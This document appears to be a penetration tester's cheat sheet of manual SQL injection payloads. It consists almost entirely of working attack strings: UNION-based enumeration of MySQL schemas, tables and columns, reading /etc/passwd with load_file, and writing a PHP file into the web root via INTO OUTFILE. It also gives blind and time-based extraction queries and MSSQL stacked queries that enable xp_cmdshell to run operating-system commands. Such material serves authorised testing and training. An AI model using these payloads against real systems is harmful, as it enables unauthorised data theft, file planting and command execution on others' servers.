# Manual SQL injection

Find string, numeric or parenthesized context; compare true/false requests.

## In-band
```sql
' AND 1=1 -- //
' AND 1=2 -- //
' ORDER BY 1-- -
' UNION SELECT NULL,NULL,NULL-- -
```
MySQL (3 columns assumed; output in a visible column):

```sql
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```
File read/write (needs `FILE`, allowed path, web handler):

```sql
' UNION SELECT 1,load_file('/etc/passwd'),3-- -
' UNION SELECT 1,'<?php echo "ok";?>',3 INTO OUTFILE '/var/www/html/check.php'-- -
```

## Blind
```sql
' AND (SELECT SUBSTRING(database(),1,1))='a' -- //
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100 -- //
' AND IF(1=1, SLEEP(5), 0) -- //
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100, SLEEP(5), 0) -- //
```

## MSSQL
Direct access: [enum/mssql.md](../enum/mssql.md). Prefix: string `';`, numeric `1;`, parenthesized `');`.

```sql
'; WAITFOR DELAY '00:00:05';-- -
1; WAITFOR DELAY '00:00:05';-- -
'); WAITFOR DELAY '00:00:05';-- -
```
```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name, value, value_in_use FROM sys.configurations
WHERE name IN ('show advanced options', 'xp_cmdshell');
```
```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami';-- -
'; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;-- -
```
- Last line undoes the enable (assumes both were off). `xp_cmdshell` runs as the service account → check `SeImpersonate`.
